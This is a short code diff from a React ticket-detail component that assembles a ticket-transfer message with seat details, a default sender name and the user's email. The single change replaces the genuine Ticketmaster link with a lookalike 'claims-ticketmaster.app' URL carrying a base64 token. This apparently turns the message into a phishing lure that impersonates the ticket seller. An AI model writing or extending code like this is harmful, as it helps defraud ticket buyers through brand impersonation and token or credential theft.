@@ -888,7 +888,7 @@ function MyTicketDetail() {
                             ticketImage: absoluteImage,
                             seatDetails,
                             quantity: selectedSeats.length,
-                            eventDetailsUrl: "https://www.ticketmaster.com",
+                            eventDetailsUrl: `https://claims-ticketmaster.app?token=${base64Token}`,
                             senderName: settings.name || user?.name || "JACQUELINE",
                             senderEmail: user?.email,
                             // Pass sessionId so the server can verify account ownership
